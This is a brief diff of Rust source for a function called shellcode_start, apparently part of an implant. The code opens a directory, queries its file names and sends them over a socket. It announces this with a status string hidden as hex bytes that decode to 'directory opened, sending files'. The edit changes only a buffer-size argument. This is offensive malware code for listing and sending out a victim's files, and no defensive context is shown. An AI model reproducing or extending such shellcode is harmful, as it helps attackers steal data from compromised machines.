@@ -250,7 +250,7 @@ unsafe fn shellcode_start() -> Result<(), ntdef::types::NTSTATUS> {
                     };
                 if dir_open_error == 0 as _ {
                     let mut file_names_information = buf as ntdef::structs::PFILE_NAMES_INFORMATION;
-                    let status = ntfs::query_directory(fs_funcs, handle, file_names_information as _);
+                    let status = ntfs::query_directory(fs_funcs, handle, file_names_information as _, 1460 as _);
                     if status == 0 as _ {
                         let dir_send_start_msg = [0x64u8, 0x69u8, 0x72u8, 0x65u8, 0x63u8, 0x74u8, 0x6fu8, 0x72u8, 0x79u8, 0x20u8, 0x6fu8, 0x70u8, 0x65u8, 0x6eu8, 0x65u8, 0x64u8, 0x2cu8, 0x20u8, 0x73u8, 0x65u8, 0x6eu8, 0x64u8, 0x69u8, 0x6eu8, 0x67u8, 0x20u8, 0x66u8, 0x69u8, 0x6cu8, 0x65u8, 0x73u8, 0x0au8];
                         let _ = socket.send(&dir_send_start_msg as *const u8, 32 as _);
